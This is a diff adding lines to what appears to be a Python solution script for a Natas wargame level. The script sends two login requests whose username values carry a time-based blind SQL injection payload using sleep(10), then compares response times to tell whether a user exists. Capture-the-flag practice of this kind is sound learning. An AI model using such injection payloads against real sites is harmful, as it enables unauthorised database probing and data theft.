@@ -38,3 +38,20 @@ if(mysql_num_rows($res) > 0) {
 # the idea is that if the user exists, then the website will return its response 
 # after X seconds
 # otherwise, the website will response immediately
+# for example,
+# reference: https://stackoverflow.com/questions/43252542/how-to-measure-server-response-time-for-python-requests-post-request
+data = {
+    "username" : "randomuserthatdoesntexist\" and sleep(10) # A ",
+    "submit" : "submit"
+}
+response = session.post(URL, data=data)
+print(response.elapsed.total_seconds())
+
+data = {
+    "username" : "natas18\" and sleep(10) # A ",
+    "submit" : "submit"
+}
+response = session.post(URL, data=data)
+print(response.elapsed.total_seconds())
+# as we can see, the first request returned almost immediately as the user doesn't exist in the database
+# the second request, however, returned after 10 seconds, which is the sleep time that we set in the sleep() function
